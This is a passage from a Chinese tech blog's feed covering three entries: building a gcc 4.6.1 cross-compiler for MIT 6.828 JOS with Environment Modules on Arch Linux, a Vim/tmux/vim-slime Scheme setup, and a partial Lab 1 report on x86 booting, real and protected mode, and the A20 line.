<p>根据<a href="https://lists.archlinux.org/pipermail/arch-dev-public/2017-November/029034.html" target="_blank" rel="external">arch-dev-public</a>，gcc-multilib已经被合并至了core/gcc之中。当然仍然可以通过<a href="https://archive.archlinux.org/" target="_blank" rel="external">Arch Linux Archive</a>获取旧版本的gcc-multilib。</p>
</blockquote>
<p>然而Arch是一个崇尚“Modernity”的发行版（参考<a href="https://wiki.archlinux.org/index.php/Arch_Linux" target="_blank" rel="external">Arch之道</a>）：</p>
<blockquote>
<p>Arch尽全力保持软件处于最新的稳定版本，只要不出现系统软件包破损，都尽量用最新版本。</p>
<p>Arch Linux strives to maintain the latest stable release versions of its software as long as systemic package breakage can be reasonably avoided.</p>
</blockquote>
<p>综合arch-dev-public对于gcc所做的改动和Arch之道，保持系统gcc为旧版本的gcc-multilib显然不是一个“优雅”的做法。最终，我决定按照<a href="https://pdos.csail.mit.edu/6.828/2017/tools.html" target="_blank" rel="external">6.828 Lab Tools</a>的指导，手动编译gcc 4.6.1作为JOS内核的交叉编译工具链。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>编译gcc 4.6.1中遇到的问题以及解决方案总结如下：</p>
<ol>
<li>网站上给出的部分软件包的下载链接已经过期。</li>
<li>网站上的教程默认将工具链安装在了/usr/local/下，这里为了管理上的方便没有采用默认的做法，而是将gcc直接安装在了home目录下（通过configure时的–prefix参数指定）。</li>
<li>接2，使用./comfigure –help获取帮助。在某些包configure时，需要使用如–with-mpc=… –with-gmp=…等参数来告知相应包的位置。</li>
<li>由于texinfo版本过高导致低版本的gcc不能正确编译，需要在configure时加上MAKEINFO=missing（当然，你也可以降级texinfo）。</li>
<li>gcc 4.6.1的源码存在一个作用域错误问题。找到gcc/gengtype.c的write_field_root函数，将struct pair new;移动到函数的起始位置。</li>
<li>编译gcc时出现了libmpc.so.2库找不到的问题。需要修改环境变量LD_LIBRARY_PATH并添加相应的目录，或者也可以在configure的时候用参数–libdir指定库位置。</li>
<li>gcc 4.6.1的源码存在一个数组访问越界错误，具体参考<a href="https://gcc.gnu.org/viewcvs/gcc?view=revision&amp;revision=191606" target="_blank" rel="external">这里</a>。</li>
</ol>
<h2 id="Modules"><a href="#Modules" class="headerlink" title="Modules"></a>Modules</h2><h3 id="包管理软件与环境变量"><a href="#包管理软件与环境变量" class="headerlink" title="包管理软件与环境变量"></a>包管理软件与环境变量</h3><blockquote>
<p>提一个简单的问题，当我们使用包管理软件（例如pacman）安装某个包（例如unzip）之后，在终端中输入unzip …即可解压zip文件。那么包管理软件究竟做了什么呢？</p>
<p>如果是从yaourt安装AUR的包，情况又会发生什么变化呢？</p>
</blockquote>
<p>包管理软件主要管理各种包以及处理包与包之间的依赖问题。在安装包的时候，包管理软件从镜像源获取包，将包解压并且将内容复制到系统对应的位置。<br>诸如yaourt这样的包管理软件使用ABS（Arch Build System），根据pkgbuild文件的指导在本机下载源码、编译并打包，并且将生成的包安装到系统中。</p>
<p>以unzip-natspec为例（这是一个可以识别zip编码格式的unzip版本），我们使用pacman查看包的内容以及对应的位置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">pacman -Ql unzip-natspec                       </div><div class="line">unzip-natspec /usr/</div><div class="line">unzip-natspec /usr/bin/</div><div class="line">unzip-natspec /usr/bin/funzip</div><div class="line">unzip-natspec /usr/bin/unzip</div><div class="line">unzip-natspec /usr/bin/unzipsfx</div><div class="line">unzip-natspec /usr/bin/zipgrep</div><div class="line">unzip-natspec /usr/bin/zipinfo</div><div class="line">unzip-natspec /usr/share/</div><div class="line">unzip-natspec /usr/share/licenses/</div><div class="line">unzip-natspec /usr/share/licenses/unzip/</div><div class="line">unzip-natspec /usr/share/licenses/unzip/LICENSE</div><div class="line">unzip-natspec /usr/share/man/</div><div class="line">unzip-natspec /usr/share/man/man1/</div><div class="line">unzip-natspec /usr/share/man/man1/funzip.1.gz</div><div class="line">unzip-natspec /usr/share/man/man1/unzip.1.gz</div><div class="line">unzip-natspec /usr/share/man/man1/unzipsfx.1.gz</div><div class="line">unzip-natspec /usr/share/man/man1/zipgrep.1.g</div></pre></td></tr></table></figure>
<p>可以看出unzip被放在/usr/bin目录下。可是为什么我们可以直接在终端中输入unzip …执行解压的命令而不是输入/usr/bin/unzip …呢？这就涉及到了环境变量PATH。</p>
<p>环境变量是一个动态命名的值，用来影响计算机上进程运行的行为。PATH设置了一组包含可执行文件的目录。在输入unzip的时候，终端默认会在PATH所包含的目录中寻找unzip，如果找到了就执行它。我们使用echo命令打印当前终端的环境变量。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></div><div class="line">/home/user/intel/vtune_amplifier_2018.1.0.535340/bin64 /bin /usr/bin /usr/<span class="built_in">local</span>/bin /usr/<span class="built_in">local</span>/sbin /usr/lib/jvm/default/bin /usr/bin/site_perl /usr/bin/vendor_perl /usr/bin/core_perl /usr/lib/smlnj/bin /usr/bin/site_perl /usr/bin/vendor_perl /usr/bin/core_perl</div></pre></td></tr></table></figure>
<p>6.828网站上默认将工具链安装在了/usr/local目录下，而/usr/local/bin是位于环境变量PATH中的。<br>因此，我们的qemu以及make可以直接找到编译好的工具链并调用。<br>现在，我们将工具链安装在了一个不属于PATH的目录中。对于这种情况，我们必须使用某种方式（如shell脚本），将相应目录添加PATH中。</p>
<p>对于我们编译的工具链，还需要设置环境变量LD_LIBRARY_PATH才可正常工作。LD_LIBRARY_PATH涉及linux的动态链接库（共享库），可以自行去搜索相关知识。</p>
<p>当我们安装的程序变多，脚本也会越变越多，管理诸如PATH的环境变量也变得不方便。<br>我们的jos内核使用的工具链加上了“i386-jos-elf”的前缀。若没有该前缀，添加环境变量后，终端会优先使用gcc 4.6.1作为默认的gcc，这显然不是我们期望的结果。<br>因此，我们可能还需要写另一个脚本，将相应的目录从PATH中移除。</p>
<p>此外，根据脚本的是否在终端启动时被执行，还可能出现不同终端环境不同的问题。</p>
<p>那么，有没有一种方法可以快速方便的管理不同软件以及他们所需要的环境变量呢？Modules正是一个可行的方法。</p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="http://modules.sourceforge.net/" target="_blank" rel="external">Modules（Environment Modules）</a>通过modulefile动态地改变用户环境。可以在Arch中安装env-modules（AUR）以使用Modules。</p>
<p>安装完毕后，需要编辑终端的配置文件来启用Modules。Modules的shell初始化放在/etc/modules/init文件夹下。</p>
<p>Modules使用Tcl作为脚本语言，编写modulefile时可以直接man modulefile获取帮助。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>给出管理jos工具链的modulefile，文件放置在/etc/modules/modulefiles文件夹下。使用module load jos加载环境，module unload jos取消环境。modulefile中的prepend-path扩展了环境变量PATH以及LD_LIBRARY_PATH。在调用unload的时候prepeng-path会自动被替换成remove-path。</p>
<p>jos<br><figure class="highlight tcl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#%Module1.0</span></div><div class="line"><span class="comment">##</span></div><div class="line"><span class="comment">## modulefile</span></div><div class="line"><span class="comment">##</span></div><div class="line"><span class="keyword">proc</span><span class="title"> ModulesHelp</span> &#123;&#125; &#123;</div><div class="line">    <span class="keyword">puts</span> stderr <span class="string">"Adds cross compile toolchain(gcc 4.6.1 i386) for MIT jos to user environment"</span></div><div class="line">&#125;</div><div class="line">module-whatis <span class="string">"adds cross compile toolchain(gcc 4.6.1 i386) for MIT jos to user environment"</span></div><div class="line"><span class="keyword">set</span>     root_dir    /home/chenzhihao/<span class="number">6.828</span>/gcc</div><div class="line">prepend-path    PATH        $root_dir/bin</div><div class="line">prepend-path    LD_LIBRARY_PATH $root_dir/lib</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在&lt;a href=&quot;http://blog.codedragon.tech/2017/12/09/MIT6-828%E6%93%8D%E4%
    
    </summary>
    
      <category term="环境配置" scheme="http://blog.codedragon.tech/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="gcc" scheme="http://blog.codedragon.tech/tags/gcc/"/>
    
      <category term="modules" scheme="http://blog.codedragon.tech/tags/modules/"/>
    
      <category term="运维" scheme="http://blog.codedragon.tech/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Vim+Tmux配置Scheme编程环境</title>
    <link href="http://blog.codedragon.tech/2017/12/11/Vim-Tmux%E9%85%8D%E7%BD%AEScheme%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83/"/>
    <id>http://blog.codedragon.tech/2017/12/11/Vim-Tmux配置Scheme编程环境/</id>
    <published>2017-12-11T14:18:25.000Z</published>
    <updated>2017-12-11T15:46:41.130Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>最近开始阅读Structure of Interpretation of Computer Science即计算机程序的构造与解释这本书。该书中使用的是Scheme作为Lisp的方言。<br>在此之前华盛顿大学的《程序设计语言》这门课的PartB中，我使用的Lisp方言是Racket，配合DrRacket作为IDE使用。因为最近一直在配置vim，这一次打算使用vim作为主力开发环境。</p>
</blockquote>
<p>如果你对我的配置文件（vim，tmux等）感兴趣，可以看<a href="https://github.com/BlackDragonF/ConfigurationFiles" target="_blank" rel="external">这里</a>。</p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>最终的效果如下图所示：<br><img src="/2017/12/11/Vim-Tmux配置Scheme编程环境/final.gif" alt="final.gif" title=""></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>最初的思路来自于网上的一篇文章，作者也是正在阅读SICP这本书，其提到了使用tmux进行分屏，在一边使用vim进行代码的编辑，另一边运行mit-scheme作为REPL（Read-Eval-Print-Loop）解释scheme代码。</p>
<p>但是如果这么做的话，需要反复执行<code>mit-scheme &lt; source.scm</code>，这样做显然不能提高我们编程的效率。</p>
<p>这几天逛友链博客的时候发现刚好Kyler也在读SICP并且配置了vim环境，具体可以参考这篇<a href="http://www.theta.live/2017/12/09/Vim-for-Scheme/" target="_blank" rel="external">博客</a>。<br>受到这篇博客的启发，我决定使用vim-slime来“沟通”vim和tmux，将vim中的Scheme代码发送到运行在tmux中的解释器，并且运行给出结果。</p>
<p>在学习tmux的过程中我接触到了tmuxinator这个tmux配置管理工具。可以通过tmuxinator直接配置tmux session，十分方便。</p>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>这篇博客的配置依赖于：</p>
<ol>
<li>vim（文本编辑器）</li>
<li>tmux和tmuxinator（终端会话工具）</li>
<li>mit-scheme（Scheme解释器）</li>
</ol>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>首先在家目录下的.tmuxinator子文件夹下创建新的配置文件scheme.yml：<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># tmuxinator configuration file for scheme  </span></div><div class="line"><span class="comment"># location: ~/.tmuxinator/scheme.yml</span></div><div class="line"></div><div class="line"><span class="attr">name:</span> <span class="string">scheme</span></div><div class="line"><span class="attr">root:</span> <span class="string">.</span></div><div class="line"></div><div class="line"><span class="attr">startup_window:</span> <span class="string">main</span></div><div class="line"><span class="attr">socket_name:</span> <span class="string">tmux_scheme</span></div><div class="line"></div><div class="line"><span class="attr">windows:</span></div><div class="line"><span class="attr">    - main:</span></div><div class="line"><span class="attr">        layout:</span> <span class="string">even-horizontal</span></div><div class="line"><span class="attr">        panes:</span></div><div class="line"><span class="bullet">            -</span> <span class="string">vim</span> &lt;%= @args[0] %&gt;</div><div class="line"><span class="bullet">            -</span> <span class="string">mit-scheme</span></div></pre></td></tr></table></figure><br>该配置文件指定新的scheme session拥有一个窗口main，该窗口有两个窗格，一个执行vim，另一个执行mit-scheme，并且创建的session的socket name为tmux_scheme。</p>
<p>然后我们在.vimrc中安装并配置vim-slime插件。<br>这里我直接使用插件管理器Vundle安装vim-slime：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bundle <span class="string">'jpalardy/vim-slime'</span></div></pre></td></tr></table></figure></p>
<p>然后在.vimrc中加入配置：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">" vim-slime configuration</span></div><div class="line"><span class="comment">" 设置目标为tmux</span></div><div class="line"><span class="keyword">let</span> <span class="variable">g:slime_target</span> = <span class="string">"tmux"</span></div><div class="line"><span class="comment">" 为tmux设置默认配置，指定socket_name为tmux_scheme，目标窗格为当前窗口的第2个窗格</span></div><div class="line"><span class="keyword">let</span> <span class="variable">g:slime_default_config</span> = &#123;<span class="string">"socket_name"</span>: <span class="string">"tmux_scheme"</span>, <span class="string">"target_pane"</span>:<span class="string">":.1"</span>&#125;</div><div class="line"><span class="comment">" 指定slime在第一次发送代码时不要询问配置</span></div><div class="line"><span class="keyword">let</span> <span class="variable">g:slime_dont_ask_default</span> = <span class="number">1</span></div><div class="line"><span class="comment">" 指定作为缓冲区的文件（该文件默认在执行完后不会被清空或者删除）</span></div><div class="line"><span class="keyword">let</span> <span class="variable">g:slime_paste_file</span> = <span class="string">"$HOME/.slime_paste"</span></div></pre></td></tr></table></figure></p>
<p>vim-slime的默认快捷键是<c-c> <c-c>（两次Ctrl-C）发送代码；<c-c> v（Ctrl-C + v）修改配置。</c-c></c-c></c-c></p>
<p>最后编写测试文件test.scm，执行<code>tmuxinator start scheme test.scm</code>，在vim中按下两次Ctrl-C。应该能实现和上文效果图一样的效果。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>本篇博客只是给出了大概的环境配置的思路以及一些具体的配置文件。<br>如果想要深度地定制属于自己的Scheme开发环境，你可能还需要阅读vim、vim-slime、tmux、tmuxinator的文档与网上的教程。<br>配置的方式也不仅仅局限于tmux，gnu-screen、vim-terminal等同样能作为vim-slime连接的目标。<br>配置的环境也不必仅仅局限于Scheme，python、sml等解释型语言均可使用。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;最近开始阅读Structure of Interpretation of Computer Science即计算机程序的构造与解释这本书。该书中使用的是Scheme作为Lisp的方言。&lt;br&gt;在此之前华盛顿大学的《程序设计语言》这门课的PartB中
    
    </summary>
    
      <category term="环境配置" scheme="http://blog.codedragon.tech/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="vim" scheme="http://blog.codedragon.tech/tags/vim/"/>
    
      <category term="tmux" scheme="http://blog.codedragon.tech/tags/tmux/"/>
    
      <category term="scheme" scheme="http://blog.codedragon.tech/tags/scheme/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.828操作系统工程Lab1-Booting a PC实验报告</title>
    <link href="http://blog.codedragon.tech/2017/12/09/MIT6-828%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8BLab1-Booting-a-PC%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2017/12/09/MIT6-828操作系统工程Lab1-Booting-a-PC实验报告/</id>
    <published>2017-12-08T19:32:48.000Z</published>
    <updated>2017-12-08T19:57:06.988Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>本学期开设了操作系统的专业课。根据老师的介绍，下个学期的操作系统课设就是MIT的6.828的Labs，再加上团队老学长/同学的推荐，打算先在这个学期完成6.828，加深对于系统的理解。<br>Lab1 - Booting a PC是比较简单的实验，主要包括了引导、内核、控制台输出、以及栈。尽管如此，由于相关知识的缺失，我断断续续做了2周（2017年10月26日）才完成该实验。<br>2017年12月9日，完成了实验的提高部分并写完了报告。</p>
</blockquote>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>首先需要完成实验环境的搭建。实验环境主要由两个部分组成：QEMU用来模拟运行内核，以及一条编译工具链用于编译和测试内核。这里我使用的系统是64位的ArchLinux。</p>
<blockquote>
<p>本部分可以参考MIT 6.828官网的<a href="https://pdos.csail.mit.edu/6.828/2017/tools.html" target="_blank" rel="external">Tools</a>。</p>
</blockquote>
<h3 id="编译工具链"><a href="#编译工具链" class="headerlink" title="编译工具链"></a>编译工具链</h3><p>编译工具链包含了C编译器、汇编器、连接器，用于从源代码生成可执行二进制文件。本实验的目标代码是32位的Intel架构（x86），可执行文件格式为ELF。</p>
<p>在Arch Linux下，若是在安装时选择了base-devel包组，则gcc应该是系统自带的编译工具链。但是，该gcc默认不能编译生成32位的可执行文件。需要我们手动开启<a href="https://wiki.archlinux.org/index.php/multilib" target="_blank" rel="external">multilib</a>并安装gcc-multilib以及相关的软件包。</p>
<h4 id="GCC版本降级说明"><a href="#GCC版本降级说明" class="headerlink" title="GCC版本降级说明"></a>GCC版本降级说明</h4><p>在我和华田的Arch下，使用gcc 7.1.1-3之后的版本编译生成的JOS kernel均无法使用。在无法查明原因的情况下，推荐将gcc降级至7.1.1-3完成6.828的实验。</p>
<p>有关于Arch下软件包降级的教程请看<a href="https://wiki.archlinux.org/index.php/downgrading_packages" target="_blank" rel="external">这里</a>。</p>
<h3 id="Qemu模拟器"><a href="#Qemu模拟器" class="headerlink" title="Qemu模拟器"></a>Qemu模拟器</h3><p>QEMU是一个现代并且快速的PC模拟器，但是为了与实验兼容，MIT推荐使用他们patched过的QEMU版本。我们按照Tools上的教程从源码编译并安装QEMU。</p>
<p>注意：提供的QEMU并不支持make uninstall，需要手动卸载QEMU。如果您于手动编译并安装可能存在的<strong>后果</strong>抱有顾虑，推荐使用包管理软件安装QEMU</p>
<h4 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h4><ol>
<li>所需要的库名可以在arch官网上通过搜索软件包的方式找到；</li>
<li>configure的时候加上–disable-werror以保证不会因出现编译警告而终止编译；</li>
<li><p>出现如下错误：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Unescaped left brace <span class="keyword">in</span> regex is illegal here <span class="keyword">in</span> regex; marked by &lt;-- HERE <span class="keyword">in</span> m/^\@strong&#123; &lt;-- HERE (.*)&#125;$/ at /home/guest/qemu/scripts/texi2pod.pl line 320.</div><div class="line"></div><div class="line">make: *** [Makefile:474：qemu.1] 错误 255。</div></pre></td></tr></table></figure>
<p> 该错误是由于perl版本更新后正则表达式语法的变动造成的，直接修改安装脚本的<code>/home/chenzhihao/qemu/scripts/texi2pod.pl line 320</code>，将<code>{</code>改成 <code>\{</code>即可；</p>
</li>
<li>configure时可能需要指定python版本为2以避免调用python3出现错误，参数为<code>--python=/usr/bin/python2.7</code>。</li>
</ol>
<h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>实验1总共分为3个部分：</p>
<ul>
<li>第1部分主要关注x86汇编语言、QEMU x86模拟器以及PC的上电启动流程；</li>
<li>第2部分主要关注6.828内核的引导程序；</li>
<li>第3部分开始挖掘6.828内核的最初模板 - JOS。</li>
</ul>
<p>实验使用Git进行版本管理，我们需要从MIT的Git克隆最开始的仓库，有关这一部分的具体说明请自行参考<a href="https://pdos.csail.mit.edu/6.828/2017/labs/lab1/" target="_blank" rel="external">Lab1实验讲义</a>。</p>
<p>有关于Git的教程推荐<a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="external">廖雪峰的官方博客</a>或者是<a href="https://www.gitbook.com/book/bingohuang/progit2/details" target="_blank" rel="external">Pro Git 2</a>。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="第一部分-PC-Bootstrap-PC引导"><a href="#第一部分-PC-Bootstrap-PC引导" class="headerlink" title="第一部分 PC Bootstrap - PC引导"></a>第一部分 PC Bootstrap - PC引导</h3><h4 id="x86汇编"><a href="#x86汇编" class="headerlink" title="x86汇编"></a>x86汇编</h4><p>本实验需要熟悉x86汇编，8086汇编我已经在王爽的《汇编语言》中学习过，x86_64汇编我也已经在《深入理解计算机系统》中有所涉猎。本实验中使用的是i386汇编。这里不再赘述。</p>
<h4 id="模拟x86"><a href="#模拟x86" class="headerlink" title="模拟x86"></a>模拟x86</h4><p>在本实验中使用QEMU作为模拟器。尽管QEMU内置的监控只能提供少量的调试支持，但是QEMU却可以作为GNU-Debugging（GDB）的远程调试目标。</p>
<p>根据实验指导使用make编译生成内核并且用make qemu或者是make qemu-nox启动QEMU。我们可以看到，当前的内核仅支持两条命令help和kerninfo。</p>
<h4 id="PC的物理地址空间"><a href="#PC的物理地址空间" class="headerlink" title="PC的物理地址空间"></a>PC的物理地址空间</h4><p>PC的物理地址空间有着如下的布局：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB)</div><div class="line">|      32-bit      |</div><div class="line">|  memory mapped   |</div><div class="line">|     devices      |</div><div class="line">|                  |</div><div class="line">/\/\/\/\/\/\/\/\/\/\</div><div class="line"></div><div class="line">/\/\/\/\/\/\/\/\/\/\</div><div class="line">|                  |</div><div class="line">|      Unused      |</div><div class="line">|                  |</div><div class="line">+------------------+  &lt;- depends on amount of RAM</div><div class="line">|                  |</div><div class="line">|                  |</div><div class="line">| Extended Memory  |</div><div class="line">|                  |</div><div class="line">|                  |</div><div class="line">+------------------+  &lt;- 0x00100000 (1MB)</div><div class="line">|     BIOS ROM     |</div><div class="line">+------------------+  &lt;- 0x000F0000 (960KB)</div><div class="line">|  16-bit devices, |</div><div class="line">|  expansion ROMs  |</div><div class="line">+------------------+  &lt;- 0x000C0000 (768KB)</div><div class="line">|   VGA Display    |</div><div class="line">+------------------+  &lt;- 0x000A0000 (640KB)</div><div class="line">|                  |</div><div class="line">|    Low Memory    |</div><div class="line">|                  |</div><div class="line">+------------------+  &lt;- 0x00000000</div></pre></td></tr></table></figure>
<p>最初的PC基于Intel的16位8088处理器，仅能够支持2^20B = 2^10KB = 1MB的寻址，早期的地址空间从0x00000开始到0xFFFFF结束。</p>
<ul>
<li>0x00000到0xA0000（640KB）被称作低内存，是早期PC能用的唯一的RAM；</li>
<li>0xA0000到0xFFFFF（384KB）被硬件保留作特殊用途如视频缓冲区或是固件，该部分最重要的区域是从0xF0000到0xFFFFF（64KB）的基本输入输出系统（BIOS）。BIOS用作执行最基本的系统初始化如激活显卡、检查内存等。在初始化完成后，BIOS从软盘、硬盘、光驱或是网络中读取操作系统，并且将机器控制权转移给操作系统。</li>
</ul>
<p>从Intel的80286到80386，处理器能够支持16MB和4GB的地址空间。但为了后向兼容性，硬件设计者保留了低1M内存的布局。<br>现代PC因此在0x000A0000到0x00100000的内存中有一个“洞”，这个洞将内存分为了低内存/保留内存（Low Memory）（低640KB）以及扩展内存（Extended Memory）（其他内存）。除此以外，32位PC的地址空间的最上方，常常被BIOS保留用作32位的PCI设备。</p>
<p>最新的x86处理器能够支持超过4GB的物理内存，因此内存可以超过0xFFFFFFFF。因此BIOS需要预留出第二个“洞”以保证那些32位的PCI设备的地址可以被正确的映射。</p>
<p>由于JOS只会使用256M内存，在此假设仅PC具有32位的地址空间。</p>
<h4 id="ROM-BIOS"><a href="#ROM-BIOS" class="headerlink" title="ROM BIOS"></a>ROM BIOS</h4><p>根据实验指导，进行QEMU和GDB的联合调试。我们会发现从上电开始，IBM PC从0x000ffff0开始执行指令。该处位于为BIOS预留的64kb的空间的顶层。此时CS = 0xf000 IP = 0xfff0。且第1条指令是一个jmp指令，跳转至CS = 0xf000 IP = 0xe05b。</p>
<p>这些都是早期的8088处理器的设计者设计的。这样的设计保证了BIOS总能控制机器。因为在刚上电的时候，在内存中并不存在能够执行的代码。</p>
<blockquote>
<p>此处需要理解8086的分段式寻址，即通过两个16位寄存器的值构造20位地址。实际地址为CS × 16 + IP = 0xf000 × 16 + 0xfff0 = 0xffff0。</p>
</blockquote>
<h3 id="第二部分-引导"><a href="#第二部分-引导" class="headerlink" title="第二部分 引导"></a>第二部分 引导</h3><p>软盘和硬盘被分为了512Bytes的区域 - 扇区（Sector）。一个扇区是磁盘传输的最小粒度：每一个读操作和写操作必须是一个或是一个以上的扇区，并且必须要对齐到扇区。</p>
<p>如果一个磁盘是可引导的，那么它的第一个扇区就被称作引导扇区，引导代码就存储在引导扇区中。如果BIOS发现了一个可引导的硬件，那么它就将这个扇区从磁盘读取至内存的0x7c00到0x7dff处，并且使用一个jmp指令设置CS：IP = 0000:7C00，将控制传递给引导。和BIOS读取地址一样，这个地址对于PC来说是固定和标准化的。</p>
<blockquote>
<p>从光盘引导的情形更加复杂，因为光盘的一个扇区为2048Byte，BIOS可以从硬盘读取一个更大的引导镜像到内存中。</p>
</blockquote>
<p>在6.828中，使用硬盘的传统引导机制。这意味这引导必须满足512个Bytes的限制。引导由一个汇编文件boot/boot.S，以及一个C语言文件boot/main.c组成。</p>
<hr>
<p>为了理解boot.S，需要以下的知识储备。</p>
<h4 id="实模式和保护模式"><a href="#实模式和保护模式" class="headerlink" title="实模式和保护模式"></a>实模式和保护模式</h4><h5 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h5><p>实模式是为了与8086兼容而设置的。在实模式下，处理器相当于一个快速的8086处理器。当处理器被加电或者复位时以实模式启动。</p>
<ul>
<li>实模式下各寄存器以实模式的初始化值工作；</li>
<li>实模式的地址空间总共为20位（1MB）；</li>
<li>实模式下不支持内存分页机制；</li>
<li>实模式下各内存段均是可读、可写、可执行的，不支持指令优先级，所有的指令均运行在特权级；</li>
<li>实模式不支持多任务切换；</li>
<li>实模式的中断处理也和8086相同，使用中断向量表来定位中断服务程序。</li>
</ul>
<p>在保护模式下，处理器的所有功能都是可用的。具体来说：</p>
<ul>
<li>保护模式提供了完全的32位地址空间，寻址空间为4GB；</li>
<li>保护模式支持内存分页机制，提供了对虚拟内存的硬件支持；</li>
<li>保护模式的处理器支持多任务（上下文切换）；</li>
<li>保护模式的处理器支持指令和数据的特权级，配合边界检查等机制，既可以共享数据也可以隔离各个任务。</li>
</ul>
<p>为了保证后向兼容性，x86的处理器启动时默认是实模式，需要手动从实模式切换至保护模式。但是切换至保护模式之前需要做一些必要的准备工作，如打开A20和建立全局描述符表等。</p>
<h4 id="A20地址线"><a href="#A20地址线" class="headerlink" title="A20地址线"></a>A20地址线</h4><p>在早期的PC上处理器仅支持20位的地址空间，任何超过20位的地址都会被卷回。<br>例如：0xFFFF+0xFFFF = 0x1FFFE -&gt; 0xFFFE</p>
<p>然而，从80286开始，Intel支持了24位的地址空间，上例的地址相加将不会发生卷回。<br>为了保证与早期PC的完全兼容，Intel采用了“黑魔法” - 将A20（第21根）地址线与键盘控制器的一个输出进行了与运算。进而控制A20地址线的值。</p>
<p>默认情况下，A20是置0的，PC将只能访问1M、3M、5M…这样的奇数段。进入保护模式前我们需要先打开A20以获得完全的寻址能力。</p>
<p>JOS内核通过端口的方式与键盘控制器进行通信并打开A20。可以参考Reference中的<a href="http://www.computer-engineering.org/ps2keyboard/" target="_blank" rel="external">PS/2 Keyboard Interface</a>。</p>
<ul>
<li>8042有一个1 Byte的输入缓冲区，一个1 Byte的输出缓冲区、一个1 Byte的状态寄存器、以及一个1 Byte的控制寄存器。前三个寄存器可以直接从0x60和0x64端口进行访问。最后一个寄存器通过“Read Command Byte”命令进行读，通过“Write Command Byte”命令进行写。</li>
<li>对0x60端口读会读输入缓冲区；对0x60端口写会写输出缓冲区；对0x64端口读会读状态寄存器；对0x64端口写会发送命令。</li>
<li>状态寄存器的Bit1为IBF - Input Buffer Full，当该Bit为1时，输入缓冲区满，不能对0x60端口或0x64端口写。</li>
<li>对0x64端口写0xd1发送的命令是“Write Output Port”写输出端口，表明将参数写入输出端口（0x60端口写）。</li>
